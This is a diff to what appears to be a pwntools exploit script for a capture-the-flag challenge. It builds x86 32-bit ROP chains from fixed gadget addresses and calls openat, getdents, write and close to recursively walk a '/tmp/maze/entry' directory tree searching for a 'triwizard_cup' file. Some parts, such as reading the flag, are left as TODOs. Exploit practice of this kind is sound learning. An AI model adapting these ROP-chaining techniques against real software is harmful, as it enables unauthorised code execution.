@@ -45,6 +45,7 @@ gdbscript = '''
 tbreak *0x{exe.entry:x}
 set follow-fork-mode parent
 b *0x13371F82
+b *0x13371f47
 continue
 '''.format(**locals())
 
@@ -57,68 +58,94 @@ continue
 # NX:       NX enabled
 # PIE:      No PIE (0x13370000)
 
-# class TreeNode:
-#     def __init__(self, value):
-#         self.value = value
-#         self.children = []
-
-#     def add_child(self, child_node):
-#         self.children.append(child_node)
-
-#     def find_path(self, target_value):
-#         if self.value == target_value:
-#             return [self.value]
-#         for child in self.children:
-#             path = child.find_path(target_value)
-#             if path:
-#                 return [self.value] + path
-#         return None
-
-# root = TreeNode(b"/tmp/maze/entry")
-
-MAX_BRANCH = 10 # take a look at the magestic find-max-branch.sh script
+MAX_BRANCH = 12 # take a look at the magestic find-max-branch.sh script
+RECV_DIRNAME_BUF_SIZE = 128
 
 main = 0x13371F86
 read_buf = 0x13371f47
-filename = 0x13375D60
+filename_buf = 0x13375D60
 dirent = 0x13375000 # need to be aligned
 sys_read = 0x133723AF
 sys_openat = 0x133725d0
 sys_write = 0x133723C9
 sys_call = 0x1337233E
+sys_close = 0x133723E3
+root_dir = b"/tmp/maze/entry"
+target = b"triwizard_cup"
+dfd = 1
 
-root_dir = b"/tmp/maze/entry\x00"
+def find(children, filename):
+    global dfd
+    rop = ROP(exe)
+
+    for child in children:
+        log.info(f"Searching in {child}")
+
+        if child == filename:
+            log.success("Found flag file")
+            break
+            # return
+            # TODO: read and print flag
+
+        rop.call(sys_read, [0, filename_buf, 100]) # zero out memory
+        rop.call(sys_read, [0, filename_buf, len(child)])
+
+        if child == root_dir:
+            rop.call(sys_openat, [constants.AT_FDCWD, filename_buf, constants.O_RDONLY, 0])
+        else:
+            rop.call(sys_openat, [dfd, filename_buf, constants.O_RDONLY, 0])   
+
+        dfd += 1
+
+        # rop.call(sys_call, [0x59, dfd, dirent, 0, 0, 0]) # ignore .
+        # rop.call(sys_call, [0x59, dfd, dirent, 0, 0, 0]) # ignore ..
+
+        for i in range(MAX_BRANCH):
+            rop.call(sys_call, [0x59, dfd, dirent, 0, 0, 0])
+            rop.call(sys_write, [1, dirent, RECV_DIRNAME_BUF_SIZE])
+
+        rop.raw(p32(read_buf))
+
+        payload = rop.chain()
+
+        # payload += p32(read_buf)
+        # TODO: close syscall of dir
+
+        assert(len(payload) < 1025)
+        io.sendafter(b"Give me your x86 32bit ROP chain (exactly 1024 bytes):\n", payload.ljust(1024))
+        io.send(b"\x00" * 100) # zero out the memory of the filename so we don't have to handle null terminated strings here
+        io.send(child)
+        # io.send(b"\x00" * 100 * MAX_BRANCH)
+
+        entries = set()
+        for i in range(MAX_BRANCH):
+            data = io.recv(RECV_DIRNAME_BUF_SIZE)
+            name_len= data[8]
+            name_start = 10
+            name_end = name_start + name_len
+            entries.add(data[name_start:name_end])
+
+        entries.pop()
+        entries.remove(b".")
+        entries.remove(b"..")
+
+        print(f"{entries=}")
+        if entries:
+            find(entries, target)
+
+        rop = ROP(exe)
+        rop.call(sys_close, [dfd])
+        rop.raw(p32(read_buf))
+        payload = rop.chain()
+        io.sendafter(b"Give me your x86 32bit ROP chain (exactly 1024 bytes):\n", payload.ljust(1024))
+        dfd -= 1
 
 io = start()
 
-rop = ROP(exe)
-
-rop.call(sys_read, [0, filename, len(root_dir)])
-rop.call(sys_openat, [constants.AT_FDCWD, filename, constants.O_RDONLY, 0])
-
-
-rop.call(sys_call, [0x59, 2, dirent, 0, 0, 0]) # ignore .
-rop.call(sys_call, [0x59, 2, dirent, 0, 0, 0]) # ignore ..
-
-for i in range(MAX_BRANCH):
-    rop.call(sys_call, [0x59, 2, dirent, 0, 0, 0])
-    rop.call(sys_write, [1, dirent, 0x100])
-
-print(rop.dump())
-
-payload = rop.chain()
-# payload += p32(read_buf)
-# TODO: close syscall of dir
-
-io.sendafter(b"Give me your x86 32bit ROP chain (exactly 1024 bytes):\n", payload.ljust(1024))
-io.send(root_dir)
-
-entries = set()
-for i in range(MAX_BRANCH):
-    data = io.recv(0x100)
-    entries.add(data[10:10+data[8]])
-
-print(entries)
+parent = set()
+parent.add(root_dir)
+print(parent)
+find(parent, target)
 
 io.interactive()
 
